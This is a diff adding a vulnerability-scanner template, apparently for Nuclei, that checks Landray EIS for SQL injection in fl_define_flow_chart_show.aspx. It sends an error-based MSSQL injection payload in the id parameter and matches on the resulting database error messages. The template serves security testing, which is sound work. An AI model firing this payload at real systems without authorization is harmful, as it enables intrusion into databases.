@@ -1,0 +1,21 @@
+id: landray-eis-fl-define-flow-chart-show-sqli
+info:
+  name: Landray EIS fl_define_flow_chart_show SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/flow/fl_define_flow_chart_show.aspx?id=1%20and%201=@@version--+"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "Microsoft SQL Server"
+          - "转换成数据类型 int 时失败"
+          - "在将 nvarchar 值"
